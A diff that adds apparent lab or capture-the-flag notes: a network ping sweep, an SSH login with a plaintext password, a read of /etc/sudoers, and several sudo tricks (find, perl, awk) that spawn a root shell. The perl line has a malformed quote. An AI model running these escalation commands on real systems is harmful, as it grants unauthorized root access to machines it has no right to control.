@@ -1,0 +1,24 @@
+nmap -sP 1.0.8.0/27
+ssh bob@1.0.8.2 -p 22
+pass = secret
+sudo -l
+cat /etc/sudoers 
+
+-------------------
+sudo bash
+whoami
+
+sudo sh
+whoami
+
+sudo find /home -exec /bin/bash \;
+id
+whoami
+
+sudo perl -e 'exec' "/bin/bash";'
+id
+whoami
+
+sudo awk 'BEGIN {system("/bin/bash")}'
+id
+whoami
